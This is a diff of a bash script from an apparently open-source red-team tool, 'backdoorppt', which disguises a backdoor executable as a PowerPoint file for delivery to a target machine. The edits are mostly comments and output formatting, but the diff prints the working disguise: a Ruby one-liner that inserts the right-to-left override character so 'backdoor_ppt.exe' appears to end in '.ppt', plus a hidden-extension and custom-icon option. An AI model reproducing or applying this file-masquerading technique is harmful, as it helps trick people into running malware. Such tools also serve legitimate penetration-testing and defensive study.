@@ -39,7 +39,7 @@ VeR="1.7" # script version
 ArCh=`arch` # store attackers arch
 IPATH=`pwd` # store script full path
 HoME=`echo ~` # store home full path
-CnA="ghost-in-a-shell" # script codename 
+CnA="ghost-in-a-shell" # script codename
 HkLm=`cat $HoME/.wine/system.reg | egrep -m 1 'ProductName' | cut -d '=' -f2 | cut -d '"' -f2` > /dev/null 2>&1 # wine windows version
 #
 # Read options (configurations) from settings file ..
@@ -208,7 +208,7 @@ MiP=$(zenity --entry --title "☠ PAYLOAD FINAL NAME ☠" --text "example: curri
 che=`echo $UpL | cut -d '.' -f2`
 if ! [ "$che" = "exe" ]; then
   echo ""
-  echo ${RedF}[x] ABORT:${YellowF} Only [${white}.exe${YellowF}] binaries are accepted .. ${Reset};
+  echo ${RedF}[x]${YellowF}ABORT: Only [${RedF}.exe${YellowF}] binaries are accepted .. ${Reset};
   sleep 2
   exit
 fi
@@ -288,14 +288,16 @@ cat << !
 
   sleep 1
   cd $IPATH/output
-  # rename backdoor output name
+  #
+  # rename backdoor output name (only RTLO method)
+  #
   echo ${BlueF}[☆]${white}" Word doc builder (output-name) : ${GreenF}done .. "${Reset};
-
   if ! [ "$tRan" = "YES" ]; then
     echo "$MiP" > outname.txt
     #
-    # Ruby command to READ 'te.txt' that contains agent output name, then
-    # Stores it into 'fil' variable to be able to rename the agent output name ..
+    # Ruby one-liner command to READ the contents of 'outname.txt' file,
+    # That contains the agent output name, then stores it into 'fil' ruby local
+    # variable to be able to rename the agent output name using ruby syntax ..
     #
     ruby -e 'fil = File.read("outname.txt") and File.rename("backdoor_ppt.exe", "#{fil}\xe2\x80\xaetpp.exe")'
     rm outname.txt > /dev/null 2>&1
@@ -313,6 +315,9 @@ if [ "$IcOn" = "Input your own icon" ]; then
 IcOn="$PaTh"
 fi
 
+  #
+  # IF 'hide know file types extension' method its active
+  #
   if [ "$tRan" = "YES" ]; then
     echo ""
     echo ${RedF}"    Icon select : $IcOn"${Reset};
@@ -328,7 +333,12 @@ cat << !
     deliver the transformed agent to the target machine.
 
 !
+
   else
+
+    #
+    # IF 'RTLO' method its active
+    #
     echo ""
     dre="exe.ppt"
     echo ${RedF}"    Icon select : $IcOn"${Reset};
@@ -357,8 +367,10 @@ else
     echo ${white}backdoorppt${RedF}::${white}v$VeR${RedF}::${white}SuspiciousShellActivity©${RedF}::${white}RedTeam${RedF}::${white}2017${Reset};
 exit
 fi
+#
 # exit tool, and good nigth ..
-    echo ${white}Codename${RedF}::${white}$CnA ${Reset};
-    echo ${white}Author${RedF}::${white}pedr0 ubuntu${RedF}::${white}[r00t-3xp10it]${Reset};
-    echo ${white}backdoorppt${RedF}::${white}v$VeR${RedF}::${white}SuspiciousShellActivity©${RedF}::${white}RedTeam${RedF}::${white}2017${Reset};
+#
+echo ${white}Codename${RedF}::${white}$CnA ${Reset};
+echo ${white}Author${RedF}::${white}pedr0 ubuntu${RedF}::${white}[r00t-3xp10it]${Reset};
+echo ${white}backdoorppt${RedF}::${white}v$VeR${RedF}::${white}SuspiciousShellActivity©${RedF}::${white}RedTeam${RedF}::${white}2017${Reset};
 exit
